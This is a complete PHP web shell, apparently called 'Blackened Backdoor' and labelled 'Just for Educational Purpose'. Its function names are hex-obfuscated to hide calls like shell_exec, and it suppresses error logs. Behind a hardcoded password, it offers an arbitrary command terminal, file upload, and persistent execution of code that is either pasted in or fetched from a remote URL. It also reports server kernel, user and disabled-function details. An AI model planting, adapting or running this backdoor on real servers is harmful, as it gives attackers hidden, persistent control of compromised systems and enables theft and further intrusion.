<?php

/* 

Copyright ©2023 - R&D ICWR

Warning !

Just for Educational Purpose

*/

error_reporting(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

session_start();

$passwd = "blackened";

// "\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("// hex")

function blackened($str)
{

    $n = '';

    for ($i = 0; $i < "\x73\x74\x72\x6c\x65\x6e"($str) - 1; $i += 2)
    {

        $n .= "\x63\x68\x72"("\x68\x65\x78\x64\x65\x63"($str[$i] . $str[$i + 1]));

    }
    
    return $n;

}

if (isset($_GET['logout'])) {

    session_destroy();
    header("Location: ?");

}

?>
<!DOCTYPE html>
<html lang="en-US">
<html>

    <head>
        <title><?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("426c61636b656e6564204261636b646f6f72")); ?></title>
        <link rel="icon" href="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html {

                margin: 0;
                padding: 0;
                background-color: black;
                color: white;
                font-family: monospace;
                word-wrap: break-word;

            }

            input {

                background-color: transparent;
                border: 1px solid white;
                color: white;

            }

            a {

                text-decoration: underline;
                color: white;

            }
        </style>
    </head>

    <body>
<?php
if (empty($_SESSION['login'])) {

    if (isset($_POST['passwd']) && $_POST['passwd'] == $passwd) {

        $_SESSION['login'] = 1;
        header("Location: ?");

    }

?>

        <div style="position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); text-align: center;">
            <div style="margin-bottom: 10px;">
                <span style="font-size: 30px; font-weight: bold;"><?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("426c61636b656e6564204261636b646f6f72")); ?></span>
            </div>
            <div style="margin-bottom: 10px;">
                <form enctype="multipart/form-data" method="POST">
                    <input type="password" name="passwd" placeholder="******">
                    <input type="submit" value="Login">
                </form>
            </div>
            <div>
                <a target="_blank" href="<?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("68747470733a2f2f6769746875622e636f6d2f494357522d5445414d2f426c61636b656e65642d4261636b646f6f72")); ?>">Copyright &copy;<?php echo(date("Y")); ?> - R&D ICWR</a>
            </div>
        </div>

<?php
} else {

    if (isset($_SESSION["code"])) {

        if ($_GET['action'] == "clear") {

            unset($_SESSION["code"]);
            echo "<script>window.location = '?';</script>";

        }

        echo("<div style=\"margin: 0; padding: 20px; background: black;\">");
        echo("<div style=\"margin-bottom: 20px;\">");
        echo("<font style=\"font-size: 20px;\">" . "\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("426c61636b656e6564204261636b646f6f72") . "-" . "\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("50657273697374656e74204576616c20436f6465") . "</font>");
        echo("</div>");
        echo("<div>");
        echo("<a style=\"text-decoration: none; color: black; font-size: 20px; padding: 10px; background: white;\" href=\"?action=clear\">Click for Clear</a>");
        echo("</div>");
        echo("</div>");
        echo("<hr />");

        $_[0] = '<?php unlink($_[1]); ?>' . $_SESSION["code"];
        $_[1] = "blackened.temp";
        $blackened = fopen($_[1], "w");
        fwrite($blackened, $_[0]);
        fclose($blackened);
        require_once($_[1]);
        
        exit();

    }


    function change_dir($cmd)
    {

        chdir(str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']));
        $path = explode(" ", $cmd);

        if ($path[0] === "cd") {

            if (is_dir($path[1])) {

                $_SESSION['directory'] = $path[1];

            } else {

                $_SESSION['directory'] = getcwd();

            }

        }

    }

    function user()
    {

        return get_current_user();

    }

    function exe($cmd)
    {

        chdir($_SESSION['directory']);

        $check = explode(" ", $cmd);

        if ($cmd === "cd") {

            $_SESSION['directory'] = str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']);

        } else if ($check[0] === "cd") {

            change_dir(str_replace(".", "", $cmd));

        } else if ($result = "\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("7368656c6c5f65786563")($cmd)) {

            return htmlspecialchars($result);

        } else {

            return htmlspecialchars($cmd) . ": command not found";

        }

    }

    function term()
    {

        if (empty($_SESSION['directory'])) {

            $_SESSION['directory'] = getcwd();

        }

        return user() . "@" . gethostname() . ":" . $_SESSION['directory'] . " $ ";

    }

    function sessionCMD($cmd)
    {

        if (!empty($_SESSION['stdout'])) {

            if ($cmd === "clear") {

                unset($_SESSION['stdout']);
    
            } else {

                $stdout = "\t\t" . term() . $cmd . "\n\t\t<pre style=\"white-space: pre-wrap; word-break: break-word;\">" . exe($cmd) . "\t\t</pre>\n";
                $_SESSION['stdout'] .= $stdout;

            }

        } else {

            $stdout = term() . $cmd . "\n\t\t<pre style=\"white-space: pre-wrap; word-break: break-word;\">" . exe($cmd) . "\t\t</pre>\n";
            $_SESSION['stdout'] = $stdout;

        }

    }


    if (isset($_POST['cmnd'])) {
        
        sessionCMD($_POST['cmnd']);

    }

    $safe_mode = @ini_get('safe_mode');
    $df = @ini_get('disable_functions');

?>
        <div style="padding: 20px; border: 1px solid white;">
            <div style="margin-top: 10px;">
                <div style="margin-bottom: 10px;">
                    <span style="font-size: 30px; font-weight: bold;"><?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("426c61636b656e6564204261636b646f6f72")); ?></span>
                </div>
            </div>
            <hr />
            <div style="margin-bottom: 5px;">
                Date & Time : <span id="time"></span>
            </div>
            <hr />
            <div style="margin-bottom: 10px;">
                <div style="margin-bottom: 10px;">
                    <b>Information Server</b>
                </div>
                <div style="margin-bottom: 5px;">
                    Kernel : <?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("7068705f756e616d65")()); ?>
                </div>
                <div style="margin-bottom: 5px;">
                    User : <?php echo(get_current_user()); ?>
                </div>
                <div style="margin-bottom: 5px;">
                    Software : <?php echo($_SERVER ['SERVER_SOFTWARE']); ?>
                </div>
                <div style="margin-bottom: 5px;">
                    PHP Version : <?php echo(PHP_VERSION); ?>
                </div>
                <div style="margin-bottom: 5px;">
                    Safe Mode : <?php echo(($safe_mode) ? "ON" : "OFF"); ?>
                </div>
                <div style="margin-bottom: 5px;">
                    Disable Function : <?php echo((!empty($df)) ? $df : "None"); ?>
                </div>
            </div>
            <div style="margin-bottom: 10px; padding: 20px; border: 1px solid white;">
                <div style="margin-bottom: 10px;">
                    <form enctype="multipart/form-data" method="post">
                        Upload : <input type="file" name="upd">
                        <input type="submit" value="Upload">
                        <?php echo((isset($_FILES['upd'])) ? (copy($_FILES['upd']['tmp_name'], $_SESSION['directory'] . "/" . $_FILES['upd']['name']) ? 'Uploaded' : 'Failed') : ''); ?>
                    </form>
                </div>
            </div>
            <div style="margin-bottom: 10px; padding: 20px; border: 1px solid white;">
                <div sytyle="overflow: auto;">
                    <?php if (!empty($_SESSION['stdout'])) { echo($_SESSION['stdout']); } ?>
                </div>

                <form enctype="multipart/form-data" method="post">
                    <?php echo(term()); ?><input type="text" name="cmnd">
                </form>
            </div>
            <div style="margin-bottom: 10px; padding: 20px; border: 1px solid white;">
                <div style="margin-bottom: 10px;">
                    <?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("50657273697374656e74204576616c20436f64652055524c")); ?>
                </div>
                <div style="margin-bottom: 10px;">
                    <?php
                    if (!empty($_POST["url_source"])) { 

                        if ($source = "\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("66696c655f6765745f636f6e74656e7473")($_POST["url_source"])) {

                            $_SESSION["code"] = $source;
                            header("Location: ?");

                        }

                    } else if (!empty($_POST["code"])) { 

                        $_SESSION["code"] = $_POST["code"];
                        header("Location: ?");

                    }
                    ?>
                    <form enctype="multipart/form-data" method="POST">
                        <input type="text" name="url_source" />
                        <input type="submit" value="Submit">
                    </form>
                </div>
            </div>
            <div style="margin-bottom: 10px; padding: 20px; border: 1px solid white;">
                <div style="margin-bottom: 10px;">
                    <?php echo("\x62\x6c\x61\x63\x6b\x65\x6e\x65\x64"("50657273697374656e74204576616c20436f6465")); ?>
                </div>
                <div style="margin-bottom: 10px;">
                    <?php
                    if (!empty($_POST["code"])) { 

                        $_SESSION["code"] = $_POST["code"];
                        header("Location: ?");

                    }
                    ?>
                    <form enctype="multipart/form-data" method="POST">
                        <textarea style="width: 100%; height: 350px; background-color: transparent; color: white;" name="code"></textarea>
                        <br><br>
                        <input type="submit" value="Submit">
                    </form>
                </div>
            </div>
            <div style="margin-top: 10px; margin-bottom: 10px; border: 1px solid white; padding: 20px; text-align: center;">
                <a style="padding: 5px; border: 1px solid white; text-decoration: none;" href="?logout">Logout</a>
            </div>
        </div>

        <!-- Script JS -->

        <script>

            var span = document.getElementById('time');
            var d = new Date();
            span.textContent = d;

            setInterval(function()
            {

                var d = new Date();
                span.textContent = d;

            }, 1000);
            
        </script>

        <!-- End of Script JS -->
<?php
}
?>
    </body>

</html>
